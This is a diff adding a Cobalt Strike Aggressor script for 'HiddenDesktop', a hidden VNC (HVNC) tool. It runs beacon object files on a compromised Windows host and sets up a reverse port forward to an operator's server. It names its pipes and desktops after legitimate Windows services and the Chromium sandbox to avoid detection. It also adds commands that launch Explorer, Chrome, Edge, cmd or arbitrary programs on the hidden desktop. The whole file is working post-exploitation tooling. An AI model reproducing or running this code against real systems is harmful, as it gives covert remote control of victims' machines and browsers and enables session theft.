@@ -1,0 +1,227 @@
+import beacon.CommandBuilder;
+import common.CommonUtils;
+
+# https://github.com/Tylous/SourcePoint/blob/main/Loader/Loader.go#L134
+sub random_pipe {
+    @pipename_list = @();
+    add(@pipename_list, "SapIServerPipes-1-5-5-0");
+    add(@pipename_list, "epmapper-");
+    add(@pipename_list, "atsvc-");
+    add(@pipename_list, "plugplay+");
+    add(@pipename_list, "srvsvc-1-5-5-0");
+    add(@pipename_list, "W32TIME_ALT_");
+    add(@pipename_list, "tapsrv_");
+    add(@pipename_list, "Printer_Spools_");
+
+    return @pipename_list[rand(8)].rand(10).rand(10).rand(10).rand(10);
+}
+
+# https://chromium.googlesource.com/chromium/chromium/+/master/sandbox/src/window.cc#56
+sub random_desktop {
+    @desktopname_list = @();
+    add(@desktopname_list, "sbox_alternate_desktop_0x");
+
+    return @desktopname_list[0].rand(10).rand(10).rand(10).rand(10);
+}
+
+sub random_port {
+    # Random port between 20000-32000
+    return (rand(600) + 1000) * 20;
+}
+
+alias HiddenDesktop {
+    $cmd = substr($0, 14); # length of command + 1
+    @args = split(' ', $cmd); 
+    $server = @args[0];
+    $port = @args[1];
+    $pipen = @args[3];
+    $deskn = @args[2];
+
+    $barch = barch( $1 );
+    $hdfs = openf( script_resource( "HiddenDesktop. $+ $barch $+ .o") );
+    $hdrw = readb( $hdfs, -1 );
+    closef( $hdfs );
+
+    if ( @args[0] eq $null || @args[1] eq $null)
+    {
+        berror( $1, "Usage: HiddenDesktop <server> <port> [desktop name] [pipe name] \n" );
+        return;
+    }
+
+    if ( !-isnumber $port )
+    {
+        berror( $1, "Invalid port: $port\n" );
+        return;
+    }
+
+    $pid = beacon_info( $1, "pid" );
+
+    if ( $pipen eq $null )
+    {
+        $pipen = "\\\\.\\pipe\\".random_pipe();
+    }
+
+    if ( $deskn eq $null )
+    {
+        $deskn = random_desktop();
+    }
+
+    pref_set(beacon_info( $1, "bid" ) . ".desktop", $deskn);
+
+    $rport = random_port();
+    brportfwd($1, $rport, $server, $port);
+
+    btask($1, "Pipe: ".$pipen);
+    btask($1, "Desktop: ".$deskn);
+    
+    $argvs = bof_pack( $1, "szzs", $pid, $pipen, $deskn, $rport );
+    beacon_inline_execute( $1, $hdrw, "go", $argvs );
+
+    $build = [ new CommandBuilder ];
+    [$build setCommand: 40];
+    [$build addInteger: 0];
+    [$build addShort: 32];
+    [$build addShort: 15000];
+    [$build addLengthAndString: $pipen];
+    [$build addLengthAndString: "HiddenDesktop ".$deskn];
+    call( "beacons.task", $null, $1, cast( [$build build], 'b' ) );
+}
+
+beacon_command_register(
+    "HiddenDesktop",
+    "Creates an HVNC client on the host and connects to a server using rportfwd",
+    "  Usage: HiddenDesktop <server> <port> [desktop name] [pipe name]"
+);
+
+sub hd_launch_specific {
+    $deskn = pref_get(beacon_info( $1, "bid" ) . ".desktop", $null);
+    if($deskn eq $null)
+    {
+        berror( $1, "No desktop name saved\n" );
+        return;
+    }
+
+    $barch = barch( $b );
+    $hdfs = openf( script_resource( $app . "." . $barch . ".o") );
+    $hdrw = readb( $hdfs, -1 );
+    closef( $hdfs );
+
+    btask($1, "Launching " . $app . " on desktop " . $deskn);
+    $argvs = bof_pack( $b, "z", $deskn );
+    beacon_inline_execute( $b, $hdrw, "go", $argvs );
+}
+
+alias hd-launch-explorer {
+    hd_launch_specific($app => "explorer", $b => $1);
+}
+
+beacon_command_register(
+    "hd-launch-explorer",
+    "Opens Explorer on the specified desktop",
+    "  Usage: hd-launch-explorer"
+);
+
+alias hd-launch-chrome {
+    hd_launch_specific($app => "chrome", $b => $1);
+}
+
+beacon_command_register(
+    "hd-launch-chrome",
+    "Opens Google Chrome on the specified desktop",
+    "  Usage: hd-launch-chrome"
+);
+
+alias hd-launch-edge {
+    hd_launch_specific($app => "edge", $b => $1);
+}
+
+beacon_command_register(
+    "hd-launch-edge",
+    "Opens Microsoft Edge on the specified desktop",
+    "  Usage: hd-launch-edge"
+);
+
+alias hd-launch-run {
+    hd_launch_specific($app => "run", $b => $1);
+}
+
+beacon_command_register(
+    "hd-launch-run",
+    "Opens run dialogue on the specified desktop",
+    "  Usage: hd-launch-run"
+);
+
+alias hd-launch-cmd {
+    hd_launch_specific($app => "cmd", $b => $1);
+}
+
+beacon_command_register(
+    "hd-launch-cmd",
+    "Opens a command prompt on the specified desktop",
+    "  Usage: hd-launch-cmd"
+);
+
+alias hd-launch {
+    $deskn = pref_get(beacon_info( $1, "bid" ) . ".desktop", $null);
+    if($deskn eq $null)
+    {
+        berror( $1, "No desktop name saved\n" );
+        return;
+    }
+
+    $cmd = substr($0, 10); # length of command + 1
+    @args = split(' ', $cmd); 
+    $command = @args[0];
+    
+    @cmdArr = sublist(@args, 1, size(@args));
+    $arguments = "";
+    foreach %a (@cmdArr)
+    {
+        if ( !$arguments )
+        {
+            $arguments = %a;
+        }
+        else
+        {
+            $arguments = $arguments . " " . %a;
+        }
+    }
+
+    $barch = barch( $1 );
+    $hdfs = openf( script_resource( "generic. $+ $barch $+ .o") );
+    $hdrw = readb( $hdfs, -1 );
+    closef( $hdfs );
+
+    if ( @args[0] eq $null || !$command )
+    {
+        berror( $1, "Usage: hd-launch <desktop name> <command> [arguments]\n" );
+        return;
+    }
+    
+    $task =  "Executing '". $command . " " . $arguments . "' on desktop" . $deskn;
+    if( !$arguments )
+    {
+        $arguments = "NA";
+        $task =  "Executing '". $command . "' on desktop" . $deskn;
+    }
+
+    btask($1, $task);
+    $argvs = bof_pack( $1, "zzz", $deskn, $command, $arguments );
+    beacon_inline_execute( $1, $hdrw, "go", $argvs );
+}
+
+beacon_command_register(
+    "hd-launch",
+    "Executes the specified program and arguments on the specified desktop",
+    "  Usage: hd-launch <command> [arguments]"
+);
+
+alias hd-set-desktop {
+    pref_set(beacon_info( $1, "bid" ) . ".desktop", $deskn);
+}
+
+beacon_command_register(
+    "hd-set-desktop",
+    "Sets the desktop name for the current Beacon",
+    "  Usage: hd-set-desktop <desktop name>"
+);
